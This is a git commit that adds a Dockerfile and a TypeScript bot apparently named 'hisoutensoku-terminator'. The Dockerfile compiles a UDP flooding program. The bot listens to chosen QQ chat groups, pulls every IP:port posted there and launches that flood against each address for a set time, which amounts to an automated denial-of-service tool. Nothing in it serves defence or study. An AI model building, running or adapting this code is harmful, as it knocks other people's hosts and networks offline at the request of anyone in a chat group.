4bcbd0afba00a5fe020ad72279ec48775e37c304
purerosefallen <78877@qq.com>
2020-06-05 21:01:48 +0800

    finish

---
+++ Dockerfile
@@ -0,0 +1,22 @@
+FROM debian:buster-slim as builder
+RUN apt update && \
+	apt -y install build-essential && \
+	rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+
+COPY ./udpflood /usr/src/app/
+WORKDIR /usr/src/app
+RUN make -j$(nproc)
+
+FROM node:buster-slim
+RUN npm -g install typescript ts-node
+
+RUN apt update && \
+	apt -y install build-essential && \
+	rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+
+COPY --from=builder /usr/src/app/bin/Release/udpflood /usr/local/bin/
+WORKDIR /usr/src/app
+COPY package*.json ./
+RUN npm ci
+COPY . ./
+CMD ["ts-node", "./run.ts"]
---
+++ run.ts
@@ -0,0 +1,83 @@
+import * as bunyan from "bunyan";
+import * as fs from "fs";
+import * as CQHttp from "cqhttp";
+import * as _ from "underscore";
+import * as yaml from "yaml";
+import { spawn } from "child_process";
+import * as os from "os";
+
+interface CoolQConfig {
+	apiRoot: string;
+	accessToken: string;
+	secret: string;
+}
+
+interface Config {
+	address: string;
+	port: number;
+	coolq: CoolQConfig;
+	floodQQGroups: Array<number>;
+	attackTimeout: number;
+}
+
+const log = bunyan.createLogger({
+	name: "hisoutensoku-terminator"
+});
+
+let CoolQ: any, config: Config;
+
+function sleep(time: number): Promise<void> {
+	return new Promise((resolve, reject) => {
+		setTimeout(resolve, time);
+	});
+};
+
+function attack(address: string, port: number): Promise<void> {
+	log.info(`Attack of ${address}:${port} started.`);
+	const attackProcess = spawn("udpflood", ["-t", address, "-p", port.toString(), "-c", os.cpus.length.toString()]);
+	setTimeout(() => {
+		attackProcess.kill();
+	}, config.attackTimeout);
+	return new Promise(done => {
+		let check = false;
+		attackProcess.on("exit", (code, signal) => {
+			log.info(`Attack of ${address}:${port} exited.`);
+			if (!check) {
+				check = true;
+				done();
+			}
+		});
+		attackProcess.on("error", (error) => {
+			log.info(`Attack of ${address}:${port} errored: ${error.message}`);
+			if (!check) {
+				check = true;
+				done();
+			}
+		});
+	});
+}
+
+async function messageHandler(data: any): Promise<void> {
+	const groupID: number = data.group_id;
+	if (!groupID || !_.contains(config.floodQQGroups, groupID)) {
+		return;
+	}
+	const messageMatch: RegExpMatchArray = data.message.match(/(\d{1,3}(\.\d{1,3}){3}):(\d{1,5})/g);
+	if (!messageMatch) {
+		return;
+	}
+	const attackPromises = messageMatch.map(pattern => {
+		const [address, portRaw] = pattern.split(":");
+		const port = parseInt(portRaw);
+		return attack(address, port);
+	});
+	await Promise.all(attackPromises);
+}
+
+async function main(): Promise<void> {
+	config = yaml.parse(await fs.promises.readFile("./config.yaml", "utf8")) as Config;
+	CoolQ = new CQHttp(config.coolq);
+	CoolQ.on("message", messageHandler);
+	CoolQ.listen(config.port, config.address);
+ }
+main();
